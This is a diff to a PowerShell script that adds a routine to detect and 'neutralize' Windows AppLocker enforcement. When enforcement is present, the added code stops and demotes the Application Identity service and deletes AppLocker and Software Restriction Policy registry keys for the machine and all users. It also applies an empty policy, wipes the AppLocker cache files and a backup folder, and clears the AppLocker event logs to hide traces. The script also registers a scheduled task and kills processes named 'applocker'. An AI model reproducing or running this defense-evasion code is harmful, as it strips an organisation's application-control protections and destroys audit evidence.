@@ -1,6 +1,9 @@
 # Script created and registered by Bishnu Prasad Panigrahi
 # All rights reserved. Unauthorized copying, distribution, or modification of this script is prohibited.
 
+[CmdletBinding()]
+param()
+
 $ErrorActionPreference = "Stop"
 
 # ============================================================
@@ -651,6 +654,186 @@ $null = Register-ScheduledTask -TaskName $TaskName -Xml (Get-Content $tempXml | 
 
 Remove-Item $tempXml -Force -ErrorAction SilentlyContinue
 Get-Process -Name applocker,runtimesvc -ErrorAction SilentlyContinue | Stop-Process -Force
+
+# ---------------- APPLOCKER NEUTRALIZATION ----------------
+
+function Set-AppIdSvcStartType {
+    param(
+        [ValidateSet('Automatic', 'Manual')]
+        [string]$StartType
+    )
+
+    $value = if ($StartType -eq 'Automatic') { 2 } else { 3 }
+
+    reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AppIDSvc" `
+        /v Start /t REG_DWORD /d $value /f 2>$null | Out-Null
+}
+
+function Remove-AllUserSrpPolicies {
+    $srpPath = "Software\Policies\Microsoft\Windows\Safer"
+
+    Remove-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Safer" `
+        -Recurse -Force -ErrorAction SilentlyContinue
+
+    Get-ChildItem "Registry::HKEY_USERS" -ErrorAction SilentlyContinue |
+        Where-Object {
+            $_.PSChildName -match '^S-1-5-21-\d+-\d+-\d+-\d+$'
+        } |
+        ForEach-Object {
+            $path = "Registry::HKEY_USERS\$($_.PSChildName)\$srpPath"
+
+            Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
+        }
+}
+
+function Apply-Empty-AppLockerPolicy {
+    $directory = Join-Path $env:ProgramData "AppLocker"
+
+    if (-not (Test-Path $directory)) {
+        New-Item -Path $directory -ItemType Directory -Force |
+            Out-Null
+    }
+
+    $policyPath = Join-Path $directory "Empty.xml"
+    '<AppLockerPolicy Version="1" />' |
+        Set-Content -Path $policyPath -Encoding UTF8 -Force
+
+    Set-AppLockerPolicy -XmlPolicy $policyPath -ErrorAction SilentlyContinue
+}
+
+function Invoke-SystemAppLockerWipe {
+    $folder = "C:\Windows\System32\AppLocker"
+
+    if (-not (Test-Path $folder)) {
+        return
+    }
+
+    $targets = @(
+        "$folder\*.AppLocker"
+        "$folder\AppCache.dat"
+        "$folder\Cache"
+    )
+
+    foreach ($target in $targets) {
+        Remove-Item $target -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
+
+function Clear-AppLockerLogs {
+    $logs = @(
+        "Microsoft-Windows-AppLocker/EXE and DLL"
+        "Microsoft-Windows-AppLocker/MSI and Script"
+        "Microsoft-Windows-AppLocker/Packaged app-Execution"
+        "Microsoft-Windows-AppLocker/Packaged app-Deployment"
+    )
+
+    foreach ($log in $logs) {
+        & wevtutil.exe cl $log 2>$null
+    }
+}
+
+function Verify-State {
+    $service = Get-Service AppIDSvc -ErrorAction SilentlyContinue
+
+    if ($service) {
+        $service | Select-Object Name, Status, StartType |
+            Format-Table -AutoSize
+    }
+
+    $folder = "C:\Windows\System32\AppLocker"
+
+    if (Test-Path $folder) {
+        $remaining = @(Get-ChildItem $folder -Force -ErrorAction SilentlyContinue)
+        Write-Host "Remaining AppLocker files: $($remaining.Count)"
+    }
+}
+
+# ---------------- MAIN EXECUTION ----------------
+
+# Detect effective AppLocker enforcement.
+# No output and no changes if inactive or detection fails.
+
+try {
+    [xml]$policyXml = Get-AppLockerPolicy -Effective -Xml -ErrorAction Stop
+
+    $enforcedCollections = @(
+        $policyXml.SelectNodes(
+            "/AppLockerPolicy/RuleCollection[@EnforcementMode='Enabled']"
+        )
+    )
+
+    if ($enforcedCollections.Count -eq 0) {
+        return
+    }
+}
+catch {
+    return
+}
+
+# Enforcement detected. Neutralization starts here.
+
+Write-Host "AppLocker enforcement detected. Neutralizing..."
+
+try {
+    # 1. Stop Application Identity service
+    Stop-Service AppIDSvc -Force -ErrorAction SilentlyContinue
+
+    # 2. Set service to Manual
+    Set-AppIdSvcStartType -StartType Manual
+
+    # 3. Remove machine AppLocker policy registry keys
+    Remove-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" `
+        -Recurse -Force -ErrorAction SilentlyContinue
+
+    Remove-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppLocker" `
+        -Recurse -Force -ErrorAction SilentlyContinue
+
+    # 4. Remove loaded-user AppLocker policies
+    Get-ChildItem "Registry::HKEY_USERS" -ErrorAction SilentlyContinue |
+        Where-Object {
+            $_.PSChildName -match '^S-1-5-21-\d+-\d+-\d+-\d+$'
+        } |
+        ForEach-Object {
+            foreach ($subkey in @("SrpV2", "AppLocker")) {
+                $path = "Registry::HKEY_USERS\$($_.PSChildName)\SOFTWARE\Policies\Microsoft\Windows\$subkey"
+
+                Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
+            }
+        }
+
+    # 5. Remove Software Restriction Policies
+    Remove-AllUserSrpPolicies
+
+    # 6. Apply empty AppLocker policy
+    Apply-Empty-AppLockerPolicy
+
+    # 7. Refresh Group Policy
+    & gpupdate.exe /force 2>$null | Out-Null
+
+    # 8. Keep AppIDSvc stopped
+    Stop-Service AppIDSvc -Force -ErrorAction SilentlyContinue
+
+    # 9. Clear AppLocker event logs
+    Clear-AppLockerLogs
+
+    # 10. Remove compiled AppLocker cache files
+    Invoke-SystemAppLockerWipe
+
+    # 11. Remove optional backup directory
+    $backupRoot = "C:\PolicyBackup"
+
+    if (Test-Path $backupRoot) {
+        Remove-Item $backupRoot -Recurse -Force -ErrorAction SilentlyContinue
+    }
+
+    # 12. Verify and display results
+    Verify-State
+
+    Write-Host "AppLocker neutralization routine completed."
+}
+catch {
+    Write-Error "Neutralization encountered an error: $($_.Exception.Message)"
+}
 
 # ------------------------------------------------------------
 # Final output only
